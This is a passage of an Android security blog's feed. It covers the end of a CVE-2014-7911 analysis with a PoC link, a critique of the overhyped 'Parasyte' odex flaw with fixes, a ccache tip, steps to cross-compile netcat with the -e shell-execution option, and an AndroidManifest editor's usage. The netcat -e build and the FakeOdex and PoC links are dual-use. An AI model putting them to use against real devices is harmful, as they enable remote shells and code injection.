r5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如此，我们将命令字符串放在GADGET_CHUNK_ADDR + 24开始的空间就可以了，最终完成了对CVE-2014-7911漏洞的system权限提权，并执行任意代码。&lt;/p&gt;
&lt;h2 id=&quot;POC&quot;&gt;&lt;a href=&quot;#POC&quot; class=&quot;headerlink&quot; title=&quot;POC&quot;&gt;&lt;/a&gt;POC&lt;/h2&gt;&lt;p&gt;虽然retme7大神早就发布了POC,还是把我修改整理过的POC传到github上,就当保存一下。(只适用nexus5 Android4.4.4_r1)&lt;br&gt;&lt;a href=&quot;https://github.com/ele7enxxh/CVE-2014-7911&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ele7enxxh/CVE-2014-7911&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;参考文献&quot;&gt;&lt;a href=&quot;#参考文献&quot; class=&quot;headerlink&quot; title=&quot;参考文献&quot;&gt;&lt;/a&gt;参考文献&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://seclists.org/fulldisclosure/2014/Nov/51&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://seclists.org/fulldisclosure/2014/Nov/51&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://drops.wooyun.org/papers/6082&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://drops.wooyun.org/papers/6082&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/retme7/CVE-2014-7911_poc&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/retme7/CVE-2014-7911_poc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文对CVE-2014-7911漏洞的原理以及利用进行了详细分析。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>被夸大的安卓漏洞“寄生兽”</title>
    <link href="http://ele7enxxh.com/Exaggerated-Android-Vulnerability-Parasyte.html"/>
    <id>http://ele7enxxh.com/Exaggerated-Android-Vulnerability-Parasyte.html</id>
    <published>2015-07-01T08:43:11.000Z</published>
    <updated>2016-03-23T06:30:47.000Z</updated>
    
    <content type="html">&lt;p&gt;本文主要吐槽了360爆出的寄生兽漏洞，不得不说这个名字取得也真是不靠谱。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;昨天下午360安全播报把我吓了一跳，这个洞的描述简直碉堡：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;6月29日，360手机安全研究团队 vulpecker team，向补天漏洞响应平台提交了其发现的安卓app新型通用安全漏洞“寄生兽”，这个漏洞影响市面上数以千万的APP，众多流行APP也包括在内，影响范围包括百度、腾讯、阿里等众多厂商的移动产品。&lt;/p&gt;
&lt;p&gt;利用该漏洞的攻击者可以直接在用户手机中植入木马，盗取用户的短信照片等个人隐私，盗取银行、支付宝等账号密码等。目前补天已经将相关详情通知给各大安全应急响应中心，并敦请厂商收到详情及时自查，如果自家app存在相关安全问题，需及时修复。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;再来看一下补天的漏洞描述：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;360 vulpecker team发现了安卓app一种新型的通用安全漏洞，这个漏洞影响市面上众多流行APP的远程代码执行漏洞，影响范围包括百度、腾讯、阿里等众多厂商的移动产品，利用该漏洞的攻击者可以直接在用户手机中植入木马，盗取用户的短信照片等个人隐私，盗取银行、支付宝等账号密码等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;提取下关键信息，漏洞影响千万APP，包括百度、腾讯、阿里的产品，通用安全漏洞，远程代码执行漏洞。&lt;br&gt;果真如此的话，这个漏洞简直犀利。&lt;/p&gt;
&lt;h2 id=&quot;细节&quot;&gt;&lt;a href=&quot;#细节&quot; class=&quot;headerlink&quot; title=&quot;细节&quot;&gt;&lt;/a&gt;细节&lt;/h2&gt;&lt;p&gt;今天早上看到了部分细节：&lt;br&gt;&lt;a href=&quot;http://www.aqniu.com/threat-alert/8371.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.aqniu.com/threat-alert/8371.html&lt;/a&gt;&lt;br&gt;以及下午360自己在乌云公布的详细分析：&lt;br&gt;&lt;a href=&quot;http://drops.wooyun.org/papers/6910&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://drops.wooyun.org/papers/6910&lt;/a&gt;&lt;br&gt;简单描述一下漏洞细节，APP在调用DexClassLoader函数动态加载插件时，如果函数第二个参数指定的odex文件存在，则会再一个简单的弱校验通过后直接加载该odex。&lt;br&gt;然而该漏洞是否向360描述的那般强大呢？接下来我将通过360提出的4种攻击场景介绍漏洞的局限：&lt;br&gt;&lt;strong&gt;1）三星输入法远程命令执行漏洞&lt;/strong&gt;&lt;br&gt;CVE-2014-2865漏洞描述：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在能够劫持你的网络前提下,攻击者能够利用三星自带输入法更新机制进行远程代码执行并且具有 system 权限。Swift输入法预装在三星手机中并且不能卸载和禁用.即使修改了默认输入法,这个漏洞也是可以利用的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由于Swift输入法具有system权限，可以直接替换/data/dalvik-cache目录下任意app的缓存文件。然而这个漏洞利用有着较大的局限性：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;设备为S4 Mini, S4, S5, S6在内的Samsung Galaxy S手机CVE&lt;/li&gt;
&lt;li&gt;手机接入了一个不安全的网络环境中，使得攻击者进行中间人劫持&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;2）利用zip解压缩漏洞覆盖缓存代码&lt;/strong&gt;&lt;br&gt;app对zip文件进行解压遍历文件时，会调用ZipEntry.getName()方法，这个方法在官方文档描述了一个安全警告：&lt;br&gt;链接：&lt;a href=&quot;http://developer.android.com/reference/java/util/zip/ZipEntry.html#getName(&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://developer.android.com/reference/java/util/zip/ZipEntry.html#getName(&lt;/a&gt;) Gets the name of this ZipEntry&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Security note: Entry names can represent relative paths. foo/../bar or ../bar/baz ,&lt;br&gt;for example. If the entry name is being used to construct a filename or as a path&lt;br&gt;component, it must be validated or sanitized to ensure that files are not written outside&lt;br&gt;of the intended destination directory.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;那么实际上，这是由于app开发者无视了这个安全警告，在调用ZipEntry.getName()方法后，没有对”../“跳转符做过滤，导致了目录遍历，使得app在解压恶意zip压缩包时以本app的权限覆盖了缓存文件。&lt;br&gt;局限性：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;app需要有解压zip压缩包的功能&lt;/li&gt;
&lt;li&gt;不专业的app开发者&lt;/li&gt;
&lt;li&gt;需要向被攻击者发送一个zip压缩包，并诱使被攻击者用该app解压或者手机接入了一个不安全的网络环境中，使得攻击者进行中间人劫持&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;3）利用adb backup覆盖缓存代码&lt;/strong&gt;&lt;br&gt;通过adb连接手机，使用adb backup备份app私有数据，对odex进行篡改后，使用adb restore恢复数据完成odex的替换。&lt;br&gt;局限性：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;manifest文件里没有指定allowBackup=”false” &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;4）其他可能的APP数据读写&lt;/strong&gt;&lt;br&gt;以root权限直接替换任意app的缓存文件。&lt;br&gt;局限性：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当攻击者拥有了root权限，还需要替换odex这种繁琐的植入方式？？？&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;真相&quot;&gt;&lt;a href=&quot;#真相&quot; class=&quot;headerlink&quot; title=&quot;真相&quot;&gt;&lt;/a&gt;真相&lt;/h2&gt;&lt;p&gt;实际上大部分app都会将插件的缓存文件存放在私有目录下，由于Android的沙箱机制，攻击者要利用这个漏洞首先需要突破沙箱保护。可以看到，360提出的4种攻击场景全部利用了其他的漏洞或者app开发者的粗心大意，从而突破了沙箱保护。&lt;br&gt;另一方面，由于odex文件与VM版本相关，同一个odex无法在多个设备中正常运行，攻击者需要对识别不同的设备并适配不同的恶意odex，漏洞利用成本进一步加大。&lt;br&gt;总结一下漏洞利用成功的先决条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Android版本低于5.0&lt;/li&gt;
&lt;li&gt;利用了其他可突破沙箱保护的漏洞&lt;/li&gt;
&lt;li&gt;适配设备的odex文件实例&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过上面的分析，“寄生兽”漏洞虽然具有一定的影响面，然而这个漏洞的利用需要另外一个漏洞的帮助（用来突破沙箱保护），远远没有达到360对其描述的危害性。&lt;br&gt;引用网上(知乎id:shotgun)对这个漏洞的评价：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这个漏洞的利用需要另外一个漏洞的帮助，不知道为什么我就想起了“太阳能电筒”。&lt;br&gt;&lt;img src=&quot;/images/Exaggerated-Android-Vulnerability-Parasyte_1.jpg&quot; alt=&quot;1&quot;&gt;&lt;br&gt;简单来说，这个漏洞必须要有能访问到私有目录的权限才能运行，所以需要一个能提供类似权限的其他漏洞，比如之前的三星虚拟键盘漏洞。&lt;/p&gt;
&lt;p&gt;“这是无需电池的太阳能电筒。”&lt;br&gt;“那没有光呢？”&lt;br&gt;“它绝对不会亮！”&lt;br&gt;“有没有可能没有光也亮呢？”&lt;br&gt;“你可以用另外一只电筒照着它！”&lt;br&gt;“哦……”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;防范与修复&quot;&gt;&lt;a href=&quot;#防范与修复&quot; class=&quot;headerlink&quot; title=&quot;防范与修复&quot;&gt;&lt;/a&gt;防范与修复&lt;/h2&gt;&lt;p&gt;如何防范？&lt;br&gt;从用户角度来看：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;升级Android版本到5.0以上&lt;/li&gt;
&lt;li&gt;不要打开并解压来源不可信的zip压缩包&lt;/li&gt;
&lt;li&gt;手机不要接入不安全的wifi无线热点&lt;/li&gt;
&lt;li&gt;不要轻易root手机、已root手机管理好app的授权&lt;/li&gt;
&lt;li&gt;不要通过adb连接到不可信的设备&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如何修复？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;每次调用DexClassLoader方法之前，清楚已经存在的odex&lt;/li&gt;
&lt;li&gt;DexClassLoader方法的第二个参数（即odex的存放路径）不要指定在sdcard上&lt;/li&gt;
&lt;li&gt;在调用zipEntry.getName()的时候，过滤返回值中的”../“跳转符&lt;/li&gt;
&lt;li&gt;没有必要的情况下，请在manifest文件里显示指定allowBackup=”false” &lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;其他&quot;&gt;&lt;a href=&quot;#其他&quot; class=&quot;headerlink&quot; title=&quot;其他&quot;&gt;&lt;/a&gt;其他&lt;/h2&gt;&lt;p&gt;这里提供一个修改odex文件crc和modWhen的代码：&lt;br&gt;&lt;a href=&quot;https://github.com/ele7enxxh/FakeOdex&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ele7enxxh/FakeOdex&lt;/a&gt;&lt;br&gt;可用来生成一个恶意的odex，绕过弱检测。&lt;br&gt;PS：本人水平有限，上面的理解如果有错误，还请海涵。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要吐槽了360爆出的寄生兽漏洞，不得不说这个名字取得也真是不靠谱。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用ccache为编译android源码加速</title>
    <link href="http://ele7enxxh.com/Use-Ccache-To-Speed-Up-Android-Compilation.html"/>
    <id>http://ele7enxxh.com/Use-Ccache-To-Speed-Up-Android-Compilation.html</id>
    <published>2015-06-23T05:29:24.000Z</published>
    <updated>2016-03-23T06:31:25.000Z</updated>
    
    <content type="html">&lt;p&gt;本文主要介绍了如何使用ccache为编译android源码加速。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;设置环境变量：&lt;br&gt;export USE_CCACHE=1&lt;br&gt;设置缓冲目录（默认为当前用户目录下的.ccahe）：&lt;br&gt;export CCACHE_DIR=your path&lt;br&gt;在源码根目录下运行，一般为50G-100G：&lt;br&gt;prebuilts/misc/linux-x86/ccache/ccache -M 50G&lt;br&gt;搞定！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍了如何使用ccache为编译android源码加速。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>为Android编译带-e选项的netcat</title>
    <link href="http://ele7enxxh.com/Compile-Netcat-For-Android.html"/>
    <id>http://ele7enxxh.com/Compile-Netcat-For-Android.html</id>
    <published>2015-03-06T09:10:20.000Z</published>
    <updated>2016-03-23T06:30:39.000Z</updated>
    
    <content type="html">&lt;p&gt;本文主要介绍了如何为Android编译带-e选项的netcat。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;环境&lt;br&gt;OS：Ubuntu14.04 64&lt;/p&gt;
&lt;h2 id=&quot;编译busybox&quot;&gt;&lt;a href=&quot;#编译busybox&quot; class=&quot;headerlink&quot; title=&quot;编译busybox&quot;&gt;&lt;/a&gt;编译busybox&lt;/h2&gt;&lt;p&gt;首先到&lt;a href=&quot;http://www.busybox.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;下载busybox源码，这里我下载的版本为1.23.1。&lt;br&gt;搭建交叉编译环境：&lt;br&gt;&lt;code&gt;apt-get install gcc-arm-linux-gnueabi libc-dev-armel-cross&lt;/code&gt;&lt;br&gt;在busybox目录下执行：&lt;br&gt;&lt;code&gt;make menuconfig&lt;/code&gt;&lt;br&gt;进入图形选择模式，必填的选项为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Busybox Settings-&amp;gt;General Configuration-&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[*]Don&amp;apos;t use /usr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Busybox Settings-&amp;gt;Build Options-&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[*] Build BusyBox as a static binary (no shared libs)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(arm-linux-gnueabi-) Cross Compiler prefix&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Networking Utilities-&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[*] Netcat 1.10 compatibility (+2.5k)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;保存设置退出menuconfig，执行：&lt;br&gt;&lt;code&gt;make -j8&lt;/code&gt;&lt;br&gt;成功后会在当前目录生产busybox，通过busybox nc即可调用netcat。&lt;/p&gt;
&lt;h2 id=&quot;编译netcat&quot;&gt;&lt;a href=&quot;#编译netcat&quot; class=&quot;headerlink&quot; title=&quot;编译netcat&quot;&gt;&lt;/a&gt;编译netcat&lt;/h2&gt;&lt;p&gt;由于不能直接从busybox单独的提取出netcat命令，所以使用郑郭busybox稍显臃肿（strip版本大概为2m），所以我又决定直接对netcat源码进行交叉编译。&lt;br&gt;首先到&lt;a href=&quot;http://netcat.sourceforge.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;下载netcat源码这里我下载的版本是0.7.1。&lt;br&gt;这里可以采用两种编译手段：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;gnu编译&lt;br&gt;搭建交叉编译环境：&lt;br&gt;&lt;code&gt;apt-get install gcc-arm-linux-gnueabi libc-dev-armel-cross&lt;/code&gt;&lt;br&gt;修改netcat目录src文件夹下的netcat.c文件，在首部添加两个宏：#define GAPING_SECURITY_HOLE，#define TELNET。&lt;br&gt;在netcat目录下执行：&lt;br&gt;&lt;code&gt;./configure --host=arm-linux CC=arm-linux-gnueabi-gcc CFLAGS=&amp;quot;-static -O2&amp;quot;&lt;/code&gt;&lt;br&gt;&lt;code&gt;--prefix= /home/auo/Temp/netcat-0.7.1/out&lt;/code&gt;&lt;br&gt;具体路径请自行修改。&lt;br&gt;成功后，执行：&lt;br&gt;&lt;code&gt;make -j8&lt;/code&gt;&lt;br&gt;成功后继续执行：&lt;br&gt;&lt;code&gt;make install&lt;/code&gt;&lt;br&gt;生成后的netcat在/home/auo/Temp/netcat-0.7.1/out/bin/目录下，最后执行：&lt;br&gt;&lt;code&gt;arm-linux-gnueabi-strip -s &amp;#39;/home/auo/Temp/netcat-0.7.1/out/bin/netcat&amp;#39;&lt;/code&gt;&lt;br&gt;strip后netcat的大小为583.1kB。&lt;/li&gt;
&lt;li&gt;NDK编译&lt;br&gt;修改netcat目录src文件夹下的netcat.c文件，在首部添加两个宏：#define GAPING_SECURITY_HOLE，#define TELNET。&lt;br&gt;在netcat目录下执行：&lt;br&gt;&lt;code&gt;./configure --host=arm-linux CC=arm-linux-androideabi-gcc&lt;/code&gt;&lt;br&gt;&lt;code&gt;CFLAGS=&amp;quot;-static --sysroot=/home/auo/Android/android-ndk-r10d/platforms/android-21/arch-arm -O2&amp;quot;&lt;/code&gt;&lt;br&gt;&lt;code&gt;--prefix=/home/auo/Temp/netcat-0.7.1/out&lt;/code&gt;&lt;br&gt;具体路径请自行修改，环境变量自行添加。&lt;br&gt;成功后，执行：&lt;br&gt;&lt;code&gt;make -j8&lt;/code&gt;&lt;br&gt;成功后继续执行：&lt;br&gt;&lt;code&gt;make install&lt;/code&gt;&lt;br&gt;生成后的netcat在/home/auo/Temp/netcat-0.7.1/out/bin/目录下，最后执行：&lt;br&gt;&lt;code&gt;arm-linux-androideabi-strip -s &amp;#39;/home/auo/Temp/netcat-0.7.1/out/bin/netcat&amp;#39;&lt;/code&gt;&lt;br&gt;strip后netcat的大小为326.1kB，显而易见，使用ndk编译出的netcat体积要减小很多。&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍了如何为Android编译带-e选项的netcat。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AmBinaryEditor（AndroidManifest二进制修改工具介绍）</title>
    <link href="http://ele7enxxh.com/AndroidManifest-Binary-Editor.html"/>
    <id>http://ele7enxxh.com/AndroidManifest-Binary-Editor.html</id>
    <published>2015-01-30T13:54:00.000Z</published>
    <updated>2016-03-23T06:25:32.000Z</updated>
    
    <content type="html">&lt;p&gt;本文为AmBinaryEditor项目的使用说明。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;由于一次奇怪的需求，开始研究AndroidManifest的二进制格式，继而产生了直接修改AndroidManifest二进制格式的想法。虽然代码写的乱七八糟，不过好歹也是劳动成果。&lt;br&gt;在此鸣谢：MindMac对其格式的详细分析：&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=194206&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.pediy.com/showthread.php?t=194206&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;完整代码我已经上传到github上了：&lt;a href=&quot;https://github.com/ele7enxxh/AmBinaryEditor&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ele7enxxh/AmBinaryEditor&lt;/a&gt;&lt;br&gt;vs2012，gcc均能成功编译，有相同需求的可以去下一份，下面介绍一下工具的功能和用法示例：&lt;br&gt;目前功能：&lt;br&gt;&lt;strong&gt;新增、修改、删除指定名字的tag或者该tag的attr&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用法示例：&lt;br&gt;增加一个tag（-d选项指定新增tag的起始位置，如1表示添加在manifest节点之后；-c选项指定新增tag经过的节点数，以此确定新增tag的结尾位置）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;editor tag --add activity -d 1 -c 0 -i input.xml -o output.xml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;改一个tag的名字（-d选项指定要修改的tag是从manifest节点开始出现的第几个同名tag，-n选项指定tag的新名字）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ameditor tag --modify application -d 1 -n test -i input.xml -o output.xml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;删除指定tag（-d选项指定要修改的tag是从manifest节点开始出现的第几个同名tag）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ameditor tag --remove application -d 1 -i input.xml -o output.xml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;增加一个attr（-d选项指定要修改的tag是从manifest节点开始出现的第几个同名tag，-n选项指定attr的名字，-t选项指定attr的类型（后面会有更多介绍）-v选项指定attr的值，-r选项指定attr的属性ID（可选））：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ameditor attr --add application -d 1 -n name -t 3 -v test -i input.xml -o output.xml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改一个attr（-n选项指定需要修改的attr，其他同上）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ameditor attr -modify application -d 1 -n name -t 3 -v new -i input.xml -o output.xml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;删除一个attr（-n选项指定需要删除的attr，其他同上）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ameditor attr -remove application -d 1 -n name -i input.xml -o output.xml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;attr -t选项说明：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;enum&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_NULL       = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_REFERENCE  = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_ATTRIBUTE  = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_STRING     = &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_FLOAT      = &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_DIMENSION  = &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_FRACTION   = &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_FIRSTINT   = &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_DEC        = &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_HEX        = &lt;span class=&quot;number&quot;&gt;17&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_BOOLEAN    = &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_FIRSTCOLOR = &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_ARGB8      = &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_RGB8       = &lt;span class=&quot;number&quot;&gt;29&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_ARGB4      = &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_RGB4       = &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_LASTCOLOR  = &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ATTR_LASTINT    = &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;目前暂不支持ATTR_DIMENSION和ATTR_FRACTION类型。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2015.6.25更新&lt;/strong&gt;&lt;br&gt;attr -r选项说明：&lt;br&gt;当你所添加的attr的name在原axml中并不存在时，必须添加-r选项指定该name的resourceid，具体的resourceid在对应 Android 源码中/frameworks/base/core/res/res/values/public.xml中可以查到，另外此处需要输入十进制数。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文为AmBinaryEditor项目的使用说明。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2015移动安全挑战赛-第3题</title>
    <link href="http://ele7enxxh.com/2015-Mobile-Security-Challenge-3.html"/>
